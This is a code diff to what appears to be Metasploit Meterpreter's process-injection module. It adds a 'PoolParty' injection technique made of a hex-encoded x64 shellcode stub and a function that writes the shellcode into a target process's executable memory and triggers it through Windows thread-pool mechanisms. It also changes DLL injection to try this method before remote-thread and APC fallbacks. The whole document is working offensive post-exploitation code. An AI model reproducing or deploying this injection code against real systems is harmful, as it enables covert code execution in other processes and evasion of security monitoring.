@@ -1,6 +1,8 @@
+#pragma once
 #include "metsrv.h"
 #include "base_inject.h"
 #include "remote_thread.h"
+#include "pool_party.h"
 #include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
 #include <tlhelp32.h>
 
@@ -75,6 +77,26 @@ BYTE apc_stub_x64[] =		"\xFC\x80\x79\x10\x00\x0F\x85\x13\x01\x00\x00\xC6\x41\x10
 							"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 							"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 							"\x00\x00\x00";
+							
+// see '/msf3/external/source/shellcode/x64/migrate/poolparty.asm'
+BYTE poolparty_stub_x64[] = "\xFC\x55\x57\x56\x48\x89\xE7\xE9\x01\x01\x00\x00\x5E\x48\x83\xEC"
+							"\x78\xE8\xC8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2"
+							"\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72"
+							"\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C"
+							"\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48"
+							"\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75"
+							"\x72\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50"
+							"\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41"
+							"\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9"
+							"\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1"
+							"\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44"
+							"\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41"
+							"\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52"
+							"\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x8B"
+							"\x4E\x10\x48\x31\xD2\xFF\xCA\x41\xBA\x08\x87\x1D\x60\xFF\xD5\x48"
+							"\x31\xD2\x4C\x8B\x06\x4C\x8B\x4E\x08\x48\x31\xC9\x51\x51\x41\xBA"
+							"\x38\x68\x0D\x16\xFF\xD5\x48\x89\xFC\x5E\x5F\x5D\xC3\xE8\xFA\xFE"
+							"\xFF\xFF";
 
 /*
  * Attempt to gain code execution in the remote process via a call to ntdll!NtQueueApcThread
@@ -481,6 +503,106 @@ DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProces
 	return dwResult;
 }
 
+DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter) {
+	DWORD dwResult = ERROR_SUCCESS;
+	DWORD dwTechnique = MIGRATE_TECHNIQUE_POOLPARTY;
+	HANDLE hThread = NULL;
+	LPVOID lpPoolPartyStub;
+	POOLPARTYCONTEXT ctx = { 0 };
+	ctx.s.lpStartAddress = lpStartAddress;
+	ctx.p.lpParameter = lpParameter;
+	HANDLE hTriggerEvent = INVALID_HANDLE_VALUE;
+	HANDLE hRemoteTriggerEvent = INVALID_HANDLE_VALUE;
+
+	LPVOID lpStub = NULL;
+	DWORD dwStubSize = 0;
+	HANDLE hHeap = GetProcessHeap();
+	
+
+	if (!supports_poolparty_injection(dwMeterpreterArch, dwDestinationArch)) {
+		return ERROR_INVALID_FUNCTION;
+	}
+
+	POOLPARTY_INJECTOR *poolparty = GetOrInitPoolParty(dwMeterpreterArch, dwDestinationArch);
+
+	do
+	{
+	
+		if (dwDestinationArch == PROCESS_ARCH_X64 && (dwMeterpreterArch == PROCESS_ARCH_X86 || dwMeterpreterArch == PROCESS_ARCH_X86)) {
+			dprintf("[INJECT][inject_via_poolparty] using: poolparty_stub_x64");
+			lpStub = &poolparty_stub_x64;
+			dwStubSize = sizeof(poolparty_stub_x64) - 1;
+		}
+		else {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Can't inject on this target (yet)!", ERROR_INVALID_FUNCTION);
+		}
+
+		hTriggerEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+		if (!hTriggerEvent)
+		{
+			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] CreateEvent failed");
+		}
+
+		// Duplicate the event handle for the target process
+		if (!DuplicateHandle(GetCurrentProcess(), hTriggerEvent, hProcess, &ctx.e.hTriggerEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
+		{
+			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] DuplicateHandle failed");
+		}
+
+		lpPoolPartyStub = VirtualAllocEx(hProcess, NULL, dwStubSize + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		dprintf("[INJECT][inject_via_poolparty] ctx [%p] lpStartAddress: %p lpParameter %p hTriggerEvent %p", (LPBYTE) lpPoolPartyStub + dwStubSize, ctx.s.lpStartAddress, ctx.p.lpParameter, ctx.e.hTriggerEvent);
+		if (!lpPoolPartyStub) {
+			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] VirtualAllocEx failed!");
+		}
+		
+		if (!WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
+			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write custom shellcode!");
+		}
+
+		if (!WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
+			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write poolparty shellcode prologue!");
+		}
+
+		for (UINT8 variant = POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION; variant < POOLPARTY_TECHNIQUE_COUNT; variant++) {
+			if (poolparty->variants[variant].isInjectionSupported) {
+#ifdef DEBUGTRACE
+				char* VARIANT_POS_TO_STR[POOLPARTY_TECHNIQUE_COUNT] = {
+					"POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION",
+				};
+				dprintf("[INJECT][inject_via_poolparty] Attempting injection with variant %s", VARIANT_POS_TO_STR[variant]);
+#endif
+				dwResult = poolparty->variants[variant].handler(hProcess, dwDestinationArch, lpPoolPartyStub, (BYTE*)lpPoolPartyStub + dwStubSize, &hTriggerEvent);
+				if (dwResult == ERROR_SUCCESS) {
+					dprintf("[INJECT] inject_via_poolparty: injected!");
+					break;
+				}
+			}
+		}
+		if (dwResult != ERROR_SUCCESS) {
+			BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: none of the supported variant worked.", ERROR_INVALID_FUNCTION)
+		}
+
+		if (remote && response)
+		{
+			dprintf("[INJECT] inject_via_poolparty: Sending a migrate response...");
+			// Send a successful response to let the ruby side know that we've pretty
+			// much successfully migrated and have reached the point of no return
+			packet_add_tlv_uint(response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique);
+			packet_transmit_response(ERROR_SUCCESS, remote, response);
+
+			dprintf("[INJECT] inject_via_poolparty: Sleeping for two seconds...");
+			// Sleep to give the remote side a chance to catch up...
+			Sleep(2000);
+
+		}
+		SetEvent(hTriggerEvent);
+		SetLastError(dwResult);
+		CloseHandle(hTriggerEvent);
+
+	} while (0);
+	return dwResult;
+}
+
 /*
  * Inject a DLL image into a process via Reflective DLL Injection.
  *
@@ -505,32 +627,34 @@ DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProces
  *        copied into the target process. If this value is zero, then the value of lpArg is passed directly to the
  *        target and must be set to a valid address within the target process.
  */
-DWORD inject_dll( DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, LPVOID lpArg, SIZE_T stArgSize )
-{
-	DWORD dwResult                 = ERROR_ACCESS_DENIED;
-	LPVOID lpRemoteArg             = NULL;
-	HANDLE hProcess                = NULL;
-	LPVOID lpRemoteLibraryBuffer   = NULL;
-	LPVOID lpReflectiveLoader      = NULL;
-	DWORD dwReflectiveLoaderOffset = 0;
 
+
+DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, LPVOID lpArg, SIZE_T stArgSize)
+{
+	DWORD dwResult = ERROR_ACCESS_DENIED;
+	LPVOID lpRemoteArg = NULL;
+	HANDLE hProcess = NULL;
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPVOID lpReflectiveLoader = NULL;
+	DWORD dwReflectiveLoaderOffset = 0;
+	BOOL bPoolParty = supports_poolparty_injection(dwMeterpreterArch, dwDestinationArch);
 	do
 	{
-		if( !lpDllBuffer || !dwDllLength )
-			BREAK_WITH_ERROR( "[INJECT] inject_dll. No Dll buffer supplied.", ERROR_INVALID_PARAMETER );
+		if (!lpDllBuffer || !dwDllLength)
+			BREAK_WITH_ERROR("[INJECT] inject_dll. No Dll buffer supplied.", ERROR_INVALID_PARAMETER);
 		if (dwDestinationArch == PROCESS_ARCH_UNKNOWN)
 			dwDestinationArch = dwMeterpreterArch;
 
 		// check if the library has a ReflectiveLoader...
-		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpDllBuffer, reflectiveLoader );
-		if( !dwReflectiveLoaderOffset )
-			BREAK_WITH_ERROR( "[INJECT] inject_dll. GetReflectiveLoaderOffset failed.", ERROR_INVALID_FUNCTION );
+		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpDllBuffer, reflectiveLoader);
+		if (!dwReflectiveLoaderOffset)
+			BREAK_WITH_ERROR("[INJECT] inject_dll. GetReflectiveLoaderOffset failed.", ERROR_INVALID_FUNCTION);
 
-		hProcess = OpenProcess( PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid );
-		if( !hProcess )
-			BREAK_ON_ERROR( "[INJECT] inject_dll. OpenProcess failed." ); 
+		hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
+		if (!hProcess)
+			BREAK_ON_ERROR("[INJECT] inject_dll. OpenProcess failed.");
 
-		if( lpArg )
+		if (lpArg)
 		{
 			if (stArgSize)
 			{
@@ -550,33 +674,46 @@ DWORD inject_dll( DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWOR
 		}
 
 		// alloc memory (RWX) in the host process for the image...
-		lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwDllLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
-		if( !lpRemoteLibraryBuffer )
-			BREAK_ON_ERROR( "[INJECT] inject_dll. VirtualAllocEx 2 failed" ); 
+		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwDllLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (!lpRemoteLibraryBuffer)
+			BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 2 failed");
 
 		// write the image into the host process...
-		if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLength, NULL ) )
-			BREAK_ON_ERROR( "[INJECT] inject_dll. WriteProcessMemory 2 failed" ); 
+		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLength, NULL))
+			BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 2 failed");
 
 		// add the offset to ReflectiveLoader() to the remote library address...
 		lpReflectiveLoader = (LPVOID)((DWORD_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
 
 		// First we try to inject by directly creating a remote thread in the target process
-		if( inject_via_remotethread( NULL, NULL, hProcess, dwDestinationArch, lpReflectiveLoader, lpRemoteArg ) != ERROR_SUCCESS )
-		{
-			dprintf( "[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread..." );
+		if (bPoolParty) {
+			dwResult = inject_via_poolparty(NULL, NULL, hProcess, dwDestinationArch, lpReflectiveLoader, lpRemoteArg);
+			if (dwResult != ERROR_SUCCESS) {
+				dprintf("[INJECT] inject_via_poolparty failed, proceeding with legacy injection.");
+				// Reset dwResult and set bPoolParty to FALSE.
+				dwResult = ERROR_SUCCESS;
+				bPoolParty = FALSE;
+			}
+		
+		}
 
-			// If that fails we can try to migrate via a queued APC in the target process
-			if( inject_via_apcthread( NULL, NULL, hProcess, dwPid, dwDestinationArch, lpReflectiveLoader, lpRemoteArg ) != ERROR_SUCCESS )
-				BREAK_ON_ERROR( "[INJECT] inject_dll. inject_via_apcthread failed" )
+		if (!bPoolParty) {
+			if (inject_via_remotethread(NULL, NULL, hProcess, dwDestinationArch, lpReflectiveLoader, lpRemoteArg) != ERROR_SUCCESS)
+			{
+				dprintf("[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread...");
+
+				// If that fails we can try to migrate via a queued APC in the target process
+				if (inject_via_apcthread(NULL, NULL, hProcess, dwPid, dwDestinationArch, lpReflectiveLoader, lpRemoteArg) != ERROR_SUCCESS)
+					BREAK_ON_ERROR("[INJECT] inject_dll. inject_via_apcthread failed")
+			}
 		}
 
 		dwResult = ERROR_SUCCESS;
 
-	} while( 0 );
+	} while (0);
 
-	if( hProcess )
-		CloseHandle( hProcess );
+	if (hProcess)
+		CloseHandle(hProcess);
 
 	return dwResult;
 }
